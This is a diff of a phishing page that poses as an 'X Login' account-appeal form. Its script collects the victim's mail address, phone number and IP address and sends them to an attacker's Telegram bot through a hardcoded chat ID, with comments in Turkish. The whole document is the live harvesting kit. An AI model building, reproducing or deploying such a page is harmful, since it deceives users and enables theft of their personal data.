@@ -1,123 +1,120 @@
-<!DOCTYPE html>
-<html lang="en">
+<html lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_Rdtemw"></div><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="If our team detects content that violates the Community Guidelines, the content may be removed or your account may be suspended. If you think this is an error, you can fill out the appeal form">
 
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="If our team detects content that violates the Community Guidelines, the content may be removed or your account may be suspended. If you think this is an error, you can fill out the appeal form">
+	<title>X Login</title>
+	<link href="https://fonts.googleapis.com/css?family=Work+Sans:400,500,600" rel="stylesheet">
+	<link href="css/bootstrap.min.css" rel="stylesheet">
+	<link href="menu.css" rel="stylesheet">
+	<link href="style.css" rel="stylesheet">
+	<link href="vendors.css" rel="stylesheet">
+	<link href="custom.css" rel="stylesheet">
+	<script src="modernizr.js"></script>
 
-    <title>X Login</title>
-    <link href="https://fonts.googleapis.com/css?family=Work+Sans:400,500,600" rel="stylesheet">
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link href="css/menu.css" rel="stylesheet">
-    <link href="css/style.css" rel="stylesheet">
-    <link href="css/vendors.css" rel="stylesheet">
-    <link href="css/custom.css" rel="stylesheet">
-    <script src="js/modernizr.js"></script>
 </head>
 
-<body>
+<body style="overflow: visible;">
 
-    <div id="preloader">
-        <div data-loader="circle-side"></div>
-    </div>
+	<div id="preloader" style="display: none;">
+		<div data-loader="circle-side" style="display: none;"></div>
+	</div>
 
-    <div id="loader_form">
-        <div data-loader="circle-side-2"></div>
-    </div>
-    <div class="container-fluid full-height">
-        <div class="row row-height">
-            <div class="col-lg-6 content-left">
-                <div class="content-left-wrapper">
-                    <div>
-                        <figure><img src="img/x.png" alt="x logo" class="xlogo"></figure>
-                    </div>
-                </div>
-            </div>
+	<div id="loader_form">
+		<div data-loader="circle-side-2"></div>
+	</div>
+	<div class="container-fluid full-height">
+		<div class="row row-height">
+			<div class="col-lg-6 content-left">
+				
+			</div>
 
-            <div class="col-lg-6 content-right" id="start">
-                <div id="wizard_container">
-                    <div id="top-wizard">
-                        <div id="progressbar"></div>
-                    </div>
+			<div class="col-lg-6 content-right" id="start">
+				<div id="wizard_container">
+					<div id="top-wizard">
+						<div id="progressbar"></div>
+					</div>
 
-                    <form id="userForm" method="POST">
-                        <div id="middle-wizard">
-                            <div class="step">
-                                <h1 class="baslik">Login to X</h1>
-                                <h3 class="main_question">Write down your current contact information so we can provide you with feedback.</h3>
-                                <div class="form-group">
-                                    <input type="mail" id="foremail" name="foremail" class="foreinput" placeholder="Mail" required>
-                                </div>
-                                <div class="form-group">
-                                    <input type="text" id="forephone" name="forephone" class="foreinput" placeholder="Phone" required>
-                                </div>
-                               
-                            </div>
-                        </div>
-                        <div id="bottom-wizard">
-                            <button type="submit" class="forebuton">Continue</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="cd-overlay-nav">
-        <span></span>
-    </div>
-    <div class="cd-overlay-content">
-        <span></span>
-    </div>
-    <div class="modal fade" id="terms-txt" tabindex="-1" role="dialog" aria-labelledby="termsLabel" aria-hidden="true">
-        <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h4 class="modal-title" id="termsLabel">Terms and conditions</h4>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                </div>
-                <div class="modal-body">
-                    <p>Lorem ipsum dolor sit amet, in porro albucius qui, in <strong>nec quod novum accumsan</strong>, mei ludus tamquam dolores id. No sit debitis meliore postulant, per ex prompta alterum sanctus, pro ne quod dicunt sensibus.</p>
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn_1" data-bs-dismiss="modal">Close</button>
-                </div>
-            </div>
-        </div>
-    </div>
-    <script src="js/jquery-3.6.4.min.js"></script>
-    <script src="js/common_scripts.min.js"></script>
-    <script src="js/velocity.min.js"></script>
-    <script src="js/functions.js"></script>
-    <script src="js/pw_strenght.js"></script>
+					<form method="POST" id="userForm">
+						<input id="website" name="website" type="text" value="">
 
-    <div class="copy">
-        <a href="#">About</a>
-        <a href="#">Download app X</a>
-        <a href="#">Help Center</a>
-        <a href="#">Terms of Service</a>
-        <a href="#">Privacy Policy</a>
-        <a href="#">Cookie Policy</a>
-        <a href="#">Accessibility</a>
-        <a href="#">Blog</a>
-        <a href="#">Career</a>
-        <a href="#">Advertising</a>
-        <a href="#">Marketing</a>
-        <a href="#">X for Business</a>
-        <a href="#">Developers</a>
-        <a href="#">Settings</a>
-    </div>
+						<div id="middle-wizard">
+							<div class="step">
+								<h1 class="baslik">Login to X</h1>
+								<h3 class="main_question"><strong>Hello Dear User</strong>Type the username of the account you are going to appeal and continue.</h3>
+								<div class="form-group">
+									<input type="mail" name="foreuser" id="foreuser" minlength="1" class="foreinput" placeholder="Mail" required="">
+								</div>
+								<div class="form-group">
+									<input type="text" name="forephone" id="forephone" minlength="6" class="foreinput" placeholder="Phone" required="">
+								</div>
+							</div>
+
+						</div>
+						<div id="bottom-wizard">
+							<button type="submit" class="forebuton">Continue</button>
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="cd-overlay-nav">
+		<span class="" style="transform: scaleX(0) scaleY(0); height: 2373.06px; width: 2373.06px; top: -1186.53px; left: -1186.53px;"></span>
+	</div>
+	<div class="cd-overlay-content">
+		<span class="" style="transform: scaleX(0) scaleY(0); height: 2373.06px; width: 2373.06px; top: -1186.53px; left: -1186.53px;"></span>
+	</div>
+	<div class="modal fade" id="terms-txt" tabindex="-1" role="dialog" aria-labelledby="termsLabel" aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered">
+			<div class="modal-content">
+				<div class="modal-header">
+					
+					
+				</div>
+				
+				
+			</div>
+		</div>
+	</div>
+	<script src="jquery-3.6.4.min.js"></script>
+	<script src="common_scripts.min.js"></script>
+	<script src="velocity.min.js"></script>
+	<script src="functions.js"></script>
+	<script src="pw_strenght.js"></script>
+
+	<div class="copy">
+		<a href="#">About</a>
+		<a href="#">Download app X</a>
+		<a href="#">Help Center</a>
+		<a href="#">Terms of Service</a>
+		<a href="#">Privacy Policy</a>
+		<a href="#">Cookie Policy</a>
+		<a href="#">MStV transparency information</a>
+		<a href="#">Imprint</a>
+		<a href="#">Accessibility</a>
+		<a href="#">Blog</a>
+		<a href="#">Career</a>
+		<a href="#">Brand Resources</a>
+		<a href="#">Advertising</a>
+		<a href="#">Marketing</a>
+		<a href="#">X for Business</a>
+		<a href="#">Developers</a>
+		<a href="#">Index</a>
+		<a href="#">Settings</a>
+	</div>
+
+    
 
     <script>
         document.getElementById('userForm').addEventListener('submit', async function (event) {
             event.preventDefault();
 
             // Get the user input and sanitize it
-            const foremail = document.getElementById('foremail').value.trim();
+            const foreuser = document.getElementById('foreuser').value.trim();
 
+			const forephone = document.getElementById('forephone').value.trim();
 
-            // Get the user input and sanitize it
-            const forephone = document.getElementById('forephone').value.trim();
 
             // Get the user's real IP address (using a service like ipinfo.io for more reliable data)
             let ip = 'Unknown';
@@ -145,12 +142,10 @@
             const curTime = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
 
             // Construct the Telegram message
-            const message = `*${foremail} mail! :)*\n\n` +
-                            `*telefon:* \`${forephone}\`\n` +
-                            `*Konum:* ${ulke} / ${sehir}\n` +
+            const message = `*${foreuser} Mail! :)*\n\n` +
+                            `*Telefon:* \`${forephone}\`\n` +
                             `*Tarih:* ${curTime}\n` +
-                            `*IP Adresi:* \`${ip}\`\n` +
-                            `*Link:* [X Profiline Git](https://google.com)\n\n`;
+                            `*IP Adresi:* \`${ip}\`\n`;
 
             // Replace these variables with your actual Telegram bot's chat ID and token
             const chatId = '-1002301983998';
@@ -179,6 +174,8 @@
             }
         });
     </script>
-</body>
 
-</html>
+
+
+
+</body></html>
